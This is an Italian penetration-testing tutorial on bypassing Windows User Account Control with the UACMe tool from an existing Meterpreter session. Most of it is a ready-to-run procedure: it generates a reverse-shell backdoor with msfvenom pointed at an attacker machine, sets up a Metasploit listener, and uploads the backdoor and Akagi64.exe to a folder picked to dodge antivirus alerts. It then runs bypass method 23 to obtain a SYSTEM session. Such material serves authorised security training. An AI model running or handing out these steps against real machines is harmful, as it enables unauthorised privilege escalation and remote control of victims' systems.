
# Bypassing UAC with UACMe

## Cos’è l’UAC?

**UAC (User Account Control)** è una funzionalità di sicurezza introdotta con Windows Vista e mantenuta in tutte le versioni successive. Il suo obiettivo è impedire che software non autorizzati (inclusi malware) apportino modifiche critiche al sistema operativo senza il consenso esplicito dell’utente.

Quando un programma richiede privilegi elevati:

- Se l’utente è standard: viene richiesto l’inserimento delle credenziali di un amministratore.
- Se l’utente fa parte del gruppo “Administrators”: viene mostrato un prompt con richiesta di conferma.

Questo comportamento è uno dei principali ostacoli durante la **privilege escalation**, perché anche se l’utente appartiene al gruppo `Administrators`, Windows blocca l’elevazione automatica dei privilegi con un popup che richiede approvazione manuale (click su “Sì”).

## UACMe – Cos’è e come funziona?

**UACMe** è uno strumento open-source scritto in C, disponibile su <a href="https://github.com/hfiref0x/UACME">GitHub</a> 

È una collezione di oltre **70 metodi di bypass UAC** che sfruttano vulnerabilità note, abusi di comandi nativi Windows o meccanismi interni come COM hijacking o DLL injection. Ogni metodo è numerato e testato per specifiche versioni di Windows. Il binario principale è `Akagi`.

## Fasi operative

### Fase 1 – Verifica dei privilegi attuali

Verifichiamo se l’utente corrente appartiene al gruppo degli amministratori e quali privilegi ha:

su meterpeter: <br>
`getuid` ⟶ mostra il nome utente corrente associato alla sessione Meterpreter. <br> 
`getprivs` ⟶ elenca tutti i privilegi disponibili per l’utente corrente. <br> 
su shell: <br>
`net user` ⟶ mostra tutti gli utenti presenti nel sistema. <br> 
`net localgroup administrators` ⟶ mostra i membri del gruppo degli amministratori locali. <br>

Se l’utente è un amministratore ma non ha privilegi SYSTEM, sarà soggetto a UAC.

### Fase 2 – Migrazione nel processo explorer.exe

Per eseguire un bypass UAC in modo affidabile, dobbiamo migrare nel processo `explorer.exe`, poiché è eseguito nel contesto utente dell’attaccato:

`pgrep explorer` ⟶ cerca il PID del processo explorer.exe (ambiente desktop dell’utente). <br>
`migrate <PID>` ⟶ trasferisce la sessione Meterpreter nel processo explorer. <br>
`getprivs` ⟶ riconferma i privilegi dopo la migrazione. <br>

Questa migrazione è importante per evitare comportamenti anomali durante l’esecuzione del bypass UAC, perché alcuni metodi richiedono un contesto utente interattivo.

### Fase 3 – Generazione del payload

Creiamo una nuova backdoor con Meterpreter che verrà eseguita dopo il bypass:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KaliIP> LPORT=<Port> -f exe > backdoor.exe` <br>

- `-p windows/meterpreter/reverse_tcp`: specifica il payload che si connette alla nostra macchina. <br>
- `LHOST` / `LPORT`: IP e porta del nostro listener. <br>
- `-f exe`: indica che il payload deve essere generato come eseguibile Windows. <br>
- `> backdoor.exe`: salva il payload con questo nome. <br>

### Fase 4 – Creazione del listener

Impostiamo un listener Metasploit per ricevere la connessione:

`use multi/handler` ⟶ modulo per ricevere connessioni da payload. <br>
`set payload windows/meterpreter/reverse_tcp` ⟶ imposta il tipo di payload. <br>
`set LHOST <KaliIP>` ⟶ IP della macchina Kali. <br>
`set LPORT <Port>` ⟶ porta su cui ascoltare. <br>
`run` ⟶ avvia il listener. <br>

### Fase 5 – Trasferimento dei file sul target

Spostiamoci sul target e carichiamo i file necessari:

`cd C:\` ⟶ ci portiamo nella root del disco C. <br>
`mkdir Temp` ⟶ creiamo una directory di lavoro chiamata Temp. <br>
`cd Temp` ⟶ entriamo nella cartella Temp. <br>
`upload backdoor.exe` ⟶ carichiamo il payload generato. <br>
`upload Akagi64.exe` ⟶ carichiamo il file eseguibile di UACMe. <br>

Evitiamo directory utente per ridurre il rischio di allarmi antivirus.

### Fase 6 – Esecuzione del bypass

Lanciamo il file `Akagi64.exe` con il metodo `23` per bypassare l’UAC ed eseguire la backdoor:

`dir` ⟶ mostra i file nella cartella corrente, verifica della presenza dei file caricati. <br>
`./Akagi64.exe 23 C:\Temp\backdoor.exe` ⟶ esegue il metodo 23 di UACMe su `backdoor.exe`. <br>

Il metodo `23` sfrutta una tecnica documentata nel progetto UACMe. Si possono provare altri moduli se questo non funziona.
I moduli sono visionabili nella repository di UACMe nel file README.md.

### Fase 7 – Verifica della nuova sessione privilegiata

Una volta che il payload viene eseguito con privilegi elevati, otterremo una nuova sessione Meterpreter.

`getuid` ⟶ conferma l’identità utente, ci aspettiamo `NT AUTHORITY\SYSTEM`. <br>
`getprivs` ⟶ verifica tutti i privilegi ora ottenuti. <br>
`ps` ⟶ mostra i processi attivi per poter eventualmente migrare in un altro processo di sistema. <br>

Se tutto è andato a buon fine, abbiamo bypassato l’UAC ottenendo controllo SYSTEM.

---
